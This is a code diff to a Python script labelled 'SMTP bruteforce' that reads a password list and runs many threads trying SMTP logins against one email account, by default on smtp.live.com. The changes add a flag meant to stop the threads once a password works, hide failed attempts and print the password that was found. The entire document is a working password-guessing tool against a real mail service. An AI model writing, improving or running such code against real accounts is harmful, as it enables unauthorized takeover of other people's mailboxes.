@@ -2,34 +2,37 @@
 #-*-coding:utf-8-*-
 
 try:
-    import argparse,smtplib,sys,threading
+    import argparse,os,smtplib,sys,threading
 except ImportError as err:
     print(err)
 
 class my_thread(threading.Thread):
-    def __init__(self,smtp,port,mail,passwords):
+    def __init__(self,smtp,port,mail,passwords,stop):
         threading.Thread.__init__(self)
         self.smtp = smtp
         self.port = port
         self.mail = mail
         self.passwords = passwords
+        self.stop = stop
     
     def run(self):
-        while len(self.passwords) > 0:
+        while not self.stop and len(self.passwords) > 0:
             try:
                 temp_password = self.passwords.pop().decode("utf-8").rstrip("\n")
                 server = smtplib.SMTP(self.smtp,self.port)
                 server.starttls() # use smtplib.ehlo() automatically
                 server.login(self.mail,temp_password) # use smtplib.ehlo() automatically
                 server.quit()
-                print("[success] Attempting with {0} and {1}".format(self.mail,temp_password))
+                self.stop = True
             except smtplib.SMTPAuthenticationError:
-                print("[failed] Attempting with {0} and {1}".format(self.mail,temp_password))
+                pass
             except smtplib.SMTPException as err:
                 pass
             except UnicodeEncodeError as err:
                 pass
-                
+        if self.stop:
+            print("[OK] Attempting with {0}".format(temp_password))
+        
 def main():
     parser = argparse.ArgumentParser(description="**** SMTP bruteforce ****")
     parser.add_argument("-s","--smtp",type=str,action="store",default="smtp.live.com",help="Use -s,--smtp as the mail server.")
@@ -43,8 +46,9 @@ def main():
         try:
             with open(args.file,"rb") as file_stream:
                 passwords = file_stream.readlines()
+            stop = False
             for i in range(0,args.num):
-                thread = my_thread(args.smtp,args.port,args.mail,passwords)
+                thread = my_thread(args.smtp,args.port,args.mail,passwords,stop)
                 thread.start()
         except IOError as err:
             print(err)
